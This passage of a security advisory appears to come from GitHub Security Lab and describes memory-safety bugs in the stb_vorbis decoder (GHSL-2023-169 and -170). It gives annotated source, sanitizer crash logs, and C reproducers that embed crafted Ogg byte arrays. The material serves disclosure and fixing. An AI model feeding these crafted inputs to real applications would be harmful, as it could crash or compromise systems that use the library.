                            <span class="mh">0x7b</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0xd2</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span>
                            <span class="mh">0x15</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x8a</span><span class="p">,</span><span class="mh">0x8a</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x00</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stb_vorbis</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="n">stb_vorbis_open_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">stb_vorbis_close</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/src/stb/tests/../stb_vorbis.c:4107:10: runtime error: index 15 out of bounds for type 'uint8[15]' (aka 'unsigned char[15]')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /src/stb/tests/../stb_vorbis.c:4107:10 in
</code></pre></div></div>

<h3 id="issue-12-attempt-to-free-an-uninitialized-memory-pointer-in-vorbis_deinit-ghsl-2023-169">Issue 12: Attempt to free an uninitialized memory pointer in <code class="language-plaintext highlighter-rouge">vorbis_deinit</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-169</code>)</h3>

<p>A crafted file may trigger memory allocation failure in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677"><code class="language-plaintext highlighter-rouge">start_decoder</code></a> at [1]. In that case the function returns early [2], but some of the pointers in <code class="language-plaintext highlighter-rouge">f-&gt;comment_list</code> are left initialized [3].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
   <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">**</span><span class="p">)</span> <span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">));</span> <span class="c1">// [3]</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>                  <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">len</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span> <span class="c1">// [1] OOM</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>               <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span> <span class="c1">// [2]</span>

      <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">get8_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="sc">'\0'</span><span class="p">;</span>
   <span class="p">}</span>
</code></pre></div></div>

<p>Later <code class="language-plaintext highlighter-rouge">setup_free</code> is called on these pointers in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215"><code class="language-plaintext highlighter-rouge">vorbis_deinit</code></a> [4].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">vorbis_deinit</span><span class="p">(</span><span class="n">stb_vorbis</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>

   <span class="n">setup_free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">);</span>
   <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">setup_free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// [4]</span>
   <span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-11">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-11">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x6b</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0xae</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span>
                            <span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x01</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span>
                            <span class="mh">0x79</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span>
                            <span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">chan</span><span class="p">,</span> <span class="n">samplerate</span><span class="p">;</span>
    <span class="kt">short</span> <span class="o">*</span><span class="n">output</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">samples</span> <span class="o">=</span> <span class="n">stb_vorbis_decode_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chan</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">samplerate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">samples</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program with an instruction that allocator may fail (otherwise ASAN will quit early with <code class="language-plaintext highlighter-rouge">AddressSanitizer: requested allocation size ... exceeds maximum supported size</code>): <code class="language-plaintext highlighter-rouge">ASAN_OPTIONS=allocator_may_return_null=1 &lt;program name&gt;</code> to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddressSanitizer:DEADLYSIGNAL
=================================================================
==217447==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x00000041f6d4 bp 0x000000000000 sp 0x7ffd3e146c60 T0)
==217447==The signal is caused by a READ memory access.
    #0 0x41f6d4 in atomic_compare_exchange_strong&lt;__sanitizer::atomic_uint8_t&gt; /src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81:10
    #1 0x41f6d4 in AtomicallySetQuarantineFlagIfAllocated /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:610:10
    #2 0x41f6d4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:685:10
    #3 0x49e5d5 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:53:3
    #4 0x4dcedb in setup_free(stb_vorbis*, void*) tests/../stb_vorbis.c:966:4
    #5 0x4dbe57 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:7
    #6 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #7 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20
</code></pre></div></div>

<h3 id="issue-13-null-pointer-dereference-in-vorbis_deinit-ghsl-2023-170">Issue 13: Null pointer dereference in <code class="language-plaintext highlighter-rouge">vorbis_deinit</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-170</code>)</h3>

<p>A crafted file may trigger memory allocation failure in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3666"><code class="language-plaintext highlighter-rouge">start_decoder</code></a> at [1]. In that case the function returns early [2], the <code class="language-plaintext highlighter-rouge">f-&gt;comment_list</code> is set to <code class="language-plaintext highlighter-rouge">NULL</code>, but <code class="language-plaintext highlighter-rouge">f-&gt;comment_list_length</code> is not reset.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
   <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">**</span><span class="p">)</span> <span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">));</span> <span class="c1">// [1] OOM</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>                  <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span> <span class="c1">// [2]</span>
   <span class="p">}</span>
</code></pre></div></div>

<p>Later in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215"><code class="language-plaintext highlighter-rouge">vorbis_deinit</code></a> it tries to dereference the <code class="language-plaintext highlighter-rouge">NULL</code> pointer at [3].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">vorbis_deinit</span><span class="p">(</span><span class="n">stb_vorbis</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>

   <span class="n">setup_free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">);</span>
   <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">setup_free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// [3]</span>
   <span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-12">Impact</h4>

<p>This issue may lead to denial of service.</p>

<h4 id="resources-12">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xb6</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span>
                            <span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xb6</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x7b</span><span class="p">,</span>
                            <span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0x81</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span>
                            <span class="mh">0x70</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0xc6</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span>
                            <span class="mh">0x85</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span>
                            <span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xa5</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">,</span><span class="mh">0xdd</span><span class="p">,</span>
